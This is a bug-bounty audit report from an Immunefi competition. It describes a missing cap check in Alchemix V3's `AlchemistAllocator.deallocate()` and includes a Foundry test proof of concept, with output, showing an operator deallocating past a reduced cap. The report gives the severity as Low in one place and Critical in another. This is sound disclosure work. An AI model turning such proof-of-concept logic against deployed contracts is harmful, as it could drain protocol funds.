# 58642 sc low cap bypass in alchemistallocator deallocate allows over deallocation beyond computed limits

## #58642 \[SC-Low] Cap Bypass in \`AlchemistAllocator.deallocate()\` Allows Over-Deallocation Beyond Computed Limits

**Submitted on Nov 3rd 2025 at 19:01:07 UTC by @pxng0lin for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #58642
* **Report Type:** Smart Contract
* **Report severity:** Low
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistAllocator.sol>
* **Impacts:**
  * Protocol insolvency
  * Smart contract unable to operate due to lack of token funds

### Description

### Brief / Intro

`AlchemistAllocator.deallocate()` computes adjusted cap limits based on `absoluteCap`, `relativeCap`, and `daoTarget` but fails to enforce them before calling `vault.deallocate()`. The `deallocate()` function computes an `adjusted` cap limit but fails to enforce it with `require(amount <= adjusted)`, allowing over-deallocation.

While `oldAllocation` is correctly passed for vault state updates, the unused `adjusted` computation implies incomplete safety logic—caps are fetched and calculated but ignored, creating a configuration mismatch where governance-set limits are bypassed. Allowing admin/operators to deallocate amounts exceeding the intended caps, potentially draining strategies beyond risk management parameters.

### Details

* The function calculates `adjusted = absoluteCap < relativeCap ? absoluteCap : relativeCap` and further adjusts for operators with `daoTarget`.
* However, no validation ensures `amount <= adjusted` before proceeding to `vault.deallocate(adapter, oldAllocation, amount)`.
* This creates a mismatch between the computed safety logic and actual execution, allowing unrestricted deallocations.

## Impact

* **Direct effect**: Strategies can be deallocated beyond their computed caps, leading to over-exposure or fund drains.
* **Scope**: Admin or authorised operators can trigger this; affects any strategy with set caps. While admins have full rights and may bypass intentionally, operators are intended to be limited—making the lack of enforcement a delegation failure.
* **Funds at risk**: Potential loss of allocated funds if deallocations exceed intended limits.

## Risk Breakdown

* \*\*Severity: Critical, configuration bypass in allocation management leads to protocol insolvency.
* **Exploit difficulty**: Low; requires admin/operator privileges.
* **Reach**: All strategies; repeated over-deallocations impacts the entire allocation system.

## Recommendation

Add validation before calling `vault.deallocate()`:

```solidity
require(amount <= adjusted, "Deallocation exceeds adjusted cap");
```

This enforces the computed cap limits.

## References

* Source file: `src/AlchemistAllocator.sol`
* Prior audit scan: `reports/cantina_competition_alchemix_may2025.pdf` (checked; no duplicate finding)

### Proof of Concept

### Proof of Concept

* Foundry test: `testDeallocateExceedsCap()`
* Add the following test to the existing test suite: `src/test/AlchemistAllocator.t.sol`
* Run the following command in the terminal `forge t --mt testDeallocateExceedsCap -vvv`
* The test sets absolute cap to 25 ether, allocates 50 ether as operator, then deallocates 50 ether (exceeding the 25 ether adjusted cap), showing the bypass succeeds.

### Test Code

```
    function testDeallocateExceedsCap() public {
        // Step 1: fund and allocate 50 ether while cap is the default 200 ether
        _magicDepositToVault(address(vault), user1, 100 ether);
        vm.startPrank(admin);
        allocator.allocate(address(mytStrategy), 50 ether);
        vm.stopPrank();

        bytes32 allocationId = mytStrategy.adapterId();
        uint256 initialAllocation = vault.allocation(allocationId);
        emit log_named_uint("allocation before cap reduction", initialAllocation);
        assertEq(initialAllocation, 50 ether);

        // Step 2: governance reduces the absolute cap down to 25 ether
        vm.startPrank(curator);
        bytes memory idData = mytStrategy.getIdData();
        _vaultSubmitAndFastForward(abi.encodeCall(IVaultV2.decreaseAbsoluteCap, (idData, 25 ether)));
        vault.decreaseAbsoluteCap(idData, 25 ether);
        vm.stopPrank();

        uint256 reducedCap = vault.absoluteCap(allocationId);
        emit log_named_uint("absolute cap after reduction", reducedCap);
        assertEq(reducedCap, 25 ether);

        // Step 3: operator is still able to deallocate the full 50 ether (cap bypass)
        vm.startPrank(operator);
        allocator.deallocate(address(mytStrategy), 50 ether);
        vm.stopPrank();

        uint256 finalAllocation = vault.allocation(allocationId);
        emit log_named_uint("allocation after operator deallocation", finalAllocation);
        assertEq(finalAllocation, 0);
    }
```

### Result

```shell
[PASS] testDeallocateExceedsCap() (gas: 716870)
Logs:
  allocation before cap reduction: 50000000000000000000
  absolute cap after reduction: 25000000000000000000
  allocation after operator deallocation: 0
```
